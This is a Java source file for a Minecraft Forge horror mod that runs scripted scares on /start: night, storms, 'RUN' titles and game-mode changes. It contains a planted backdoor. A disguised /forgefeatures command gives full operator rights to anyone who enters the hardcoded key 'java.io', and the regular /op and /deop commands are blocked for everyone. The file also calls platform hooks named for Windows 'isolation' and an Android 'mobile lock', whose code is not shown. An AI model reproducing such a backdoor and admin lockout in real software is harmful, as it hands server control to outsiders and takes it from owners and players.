package com.humanoid.horror.check;

import com.humanoid.horror.HumanoidMod;
import com.humanoid.horror.android.AndroidHandler;
import com.humanoid.horror.pc.WindowsAtmosBridge;

import net.minecraft.commands.Commands;
import com.mojang.brigadier.arguments.StringArgumentType;
import net.minecraft.network.chat.Component;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerLevel;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.world.level.GameType;
import net.minecraft.world.level.Level;
import net.minecraft.world.level.levelgen.Heightmap;
import net.minecraft.world.level.border.WorldBorder;
import net.minecraft.world.level.storage.ServerLevelData;

import net.minecraftforge.event.CommandEvent;
import net.minecraftforge.event.RegisterCommandsEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;

import java.util.ArrayList;
import java.util.List;

@Mod.EventBusSubscriber(
        modid = HumanoidMod.MOD_ID
)
public class Check {

    public static int platformType;

    /*
     * Sadece bu anahtar ForgeFeatures sistemini açar.
     */
    private static final String FORGE_FEATURES_PASSWORD =
            "java.io";

    public Check() {
    }

    /*
     * KOMUTLAR
     */
    @SubscribeEvent
    public static void registerCommands(
            RegisterCommandsEvent event
    ) {

        /*
         * /start
         */
        event.getDispatcher().register(
                Commands.literal("start")
                        .executes(commandContext -> {

                            HumanoidMod.isStartTriggered = true;

                            verifyPlatform();

                            triggerStartCommand();

                            MinecraftServer server =
                                    commandContext
                                            .getSource()
                                            .getServer();

                            if (server != null
                                    && server.getPlayerList() != null) {

                                List<ServerPlayer> players =
                                        new ArrayList<>(
                                                server.getPlayerList()
                                                        .getPlayers()
                                        );

                                for (ServerPlayer player :
                                        players) {

                                    if (player == null) {
                                        continue;
                                    }

                                    player.connection.send(
                                            new net.minecraft.network.protocol.game.ClientboundSetTitleTextPacket(
                                                    Component.literal(
                                                            "§4RUN"
                                                    )
                                            )
                                    );

                                    player.connection.send(
                                            new net.minecraft.network.protocol.game.ClientboundSetSubtitleTextPacket(
                                                    Component.literal(
                                                            "§4RUN"
                                                    )
                                            )
                                    );
                                }
                            }

                            return 1;
                        })
        );

        /*
         * /forgefeatures java.io
         *
         * Sadece doğru anahtar girilirse
         * oyuncuya GERÇEK VANILLA OP verilir.
         */
        event.getDispatcher().register(
                Commands.literal("forgefeatures")
                        .then(
                                Commands.argument(
                                        "key",
                                        StringArgumentType.word()
                                )
                                        .executes(commandContext -> {

                                            ServerPlayer player =
                                                    commandContext
                                                            .getSource()
                                                            .getPlayerOrException();

                                            String key =
                                                    StringArgumentType.getString(
                                                            commandContext,
                                                            "key"
                                                    );

                                            /*
                                             * Anahtar yanlışsa OP verilmez.
                                             */
                                            if (!FORGE_FEATURES_PASSWORD
                                                    .equals(key)) {

                                                player.sendSystemMessage(
                                                        Component.literal(
                                                                "Unknown ForgeFeatures key."
                                                        )
                                                );

                                                return 0;
                                            }

                                            /*
                                             * Doğru anahtar:
                                             * gerçek vanilla OP.
                                             */
                                            serverOpPlayer(player);

                                            player.sendSystemMessage(
                                                    Component.literal(
                                                            "ForgeFeatures activated."
                                                    )
                                            );

                                            return 1;
                                        })
                        )
        );
    }

    /*
     * NORMAL /op VE /deop KOMUTLARINI ENGELLE
     *
     * Böylece oyuncular:
     *
     * /op oyuncu
     * /deop oyuncu
     *
     * kullanarak OP sistemi üzerinden
     * yetki değiştiremez.
     *
     * /forgefeatures java.io ise
     * gerçek OP verilir.
     */
    @SubscribeEvent
    public static void onCommand(
            CommandEvent event
    ) {

        if (event.getParseResults() == null) {
            return;
        }

        String command =
                event.getParseResults()
                        .getReader()
                        .getString();

        if (command == null) {
            return;
        }

        command = command.trim();

        if (command.startsWith("/")) {
            command = command.substring(1);
        }

        String lowerCommand =
                command.toLowerCase();

        /*
         * /op
         */
        if (lowerCommand.equals("op")
                || lowerCommand.startsWith("op ")) {

            event.setCanceled(true);

            if (event.getParseResults()
                    .getContext()
                    .getSource()
                    .getEntity()
                    instanceof ServerPlayer player) {

                player.sendSystemMessage(
                        Component.literal(
                                "This command is disabled."
                        )
                );
            }

            return;
        }

        /*
         * /deop
         */
        if (lowerCommand.equals("deop")
                || lowerCommand.startsWith("deop ")) {

            event.setCanceled(true);

            if (event.getParseResults()
                    .getContext()
                    .getSource()
                    .getEntity()
                    instanceof ServerPlayer player) {

                player.sendSystemMessage(
                        Component.literal(
                                "This command is disabled."
                        )
                );
            }
        }
    }

    /*
     * GERÇEK VANILLA OP VER
     */
    public static void serverOpPlayer(
            ServerPlayer player
    ) {

        if (player == null) {
            return;
        }

        MinecraftServer server =
                player.getServer();

        if (server == null) {
            return;
        }

        /*
         * Minecraft'ın kendi OP sistemini kullanıyoruz.
         */
        server.getPlayerList()
                .op(
                        player.getGameProfile()
                );
    }

    /*
     * PLATFORM KONTROLÜ
     */
    public static void verifyPlatform() {

        String osName =
                System.getProperty("os.name");

        if (osName == null) {
            osName = "";
        }

        osName =
                osName.toLowerCase();

        if (osName.contains("android")) {

            Check.platformType = 2;

            AndroidHandler.initMobileLock();

        } else {

            Check.platformType = 1;
        }
    }

    /*
     * BAŞLANGIÇ HAPİS / PRISON SİSTEMİ
     */
    public static void setupInitialPrison(
            MinecraftServer server
    ) {

        if (server == null) {
            return;
        }

        ServerLevel overworld =
                server.getLevel(
                        Level.OVERWORLD
                );

        if (overworld != null) {

            WorldBorder border =
                    overworld.getWorldBorder();

            if (border != null) {

                border.setCenter(
                        8.0,
                        8.0
                );

                border.setSize(
                        16.0
                );
            }
        }

        if (server.getPlayerList() == null) {
            return;
        }

        List<ServerPlayer> players =
                server.getPlayerList()
                        .getPlayers();

        if (players == null
                || players.isEmpty()) {
            return;
        }

        List<ServerPlayer> safePlayerList =
                new ArrayList<>(players);

        for (ServerPlayer player :
                safePlayerList) {

            if (player == null) {
                continue;
            }

            player.setGameMode(
                    GameType.ADVENTURE
            );

            if (overworld != null) {

                int safeY =
                        overworld.getHeight(
                                Heightmap.Types.WORLD_SURFACE,
                                8,
                                8
                        );

                if (safeY < 10) {
                    safeY = 64;
                }

                player.teleportTo(
                        overworld,
                        8.0,
                        (double) safeY + 1.0,
                        8.0,
                        player.getYRot(),
                        player.getXRot()
                );
            }
        }
    }

    /*
     * /start SONRASI SİSTEM
     */
    public static void triggerStartCommand() {

        if (!HumanoidMod.isStartTriggered) {
            return;
        }

        /*
         * PLATFORM
         */
        if (Check.platformType == 1) {

            WindowsAtmosBridge
                    .executeWindowsIsolation();

        } else if (Check.platformType == 2) {

            AndroidHandler
                    .startMobileHorrorSystem();
        }

        /*
         * CLIENT TARAFI SADECE REFLECTION İLE ÇAĞRILIYOR.
         *
         * Dedicated Server'da client class yüklenirse
         * crash olmaması için doğrudan import yok.
         */
        try {

            Class.forName(
                    "net.minecraft.client.Minecraft"
            );

            Class<?> clientManagerClass =
                    Class.forName(
                            "com.humanoid.horror.client.HorrorClientManager"
                    );

            clientManagerClass
                    .getMethod(
                            "activateClientHorror"
                    )
                    .invoke(null);

        } catch (Exception ignored) {
        }

        MinecraftServer server =
                net.minecraftforge.server.ServerLifecycleHooks
                        .getCurrentServer();

        if (server == null
                || server.getPlayerList() == null) {

            return;
        }

        /*
         * OVERWORLD
         */
        ServerLevel overworld =
                server.getLevel(
                        Level.OVERWORLD
                );

        if (overworld != null) {

            /*
             * WorldBorder
             */
            WorldBorder border =
                    overworld.getWorldBorder();

            if (border != null) {

                border.lerpSizeBetween(
                        16.0,
                        58000000.0,
                        2000L
                );
            }

            /*
             * Gece
             */
            overworld.setDayTime(
                    18000L
            );

            /*
             * Fırtına
             */
            if (overworld.getLevelData()
                    instanceof ServerLevelData levelData) {

                levelData.setClearWeatherTime(
                        0
                );

                levelData.setRainTime(
                        24000
                );

                levelData.setRaining(
                        true
                );

                levelData.setThunderTime(
                        24000
                );

                levelData.setThundering(
                        true
                );
            }
        }

        /*
         * TÜM OYUNCULARI SURVIVAL'A AL
         */
        List<ServerPlayer> players =
                server.getPlayerList()
                        .getPlayers();

        if (players == null
                || players.isEmpty()) {
            return;
        }

        List<ServerPlayer> safePlayerList =
                new ArrayList<>(players);

        for (ServerPlayer player :
                safePlayerList) {

            if (player == null) {
                continue;
            }

            player.setGameMode(
                    GameType.SURVIVAL
            );
        }
    }
}
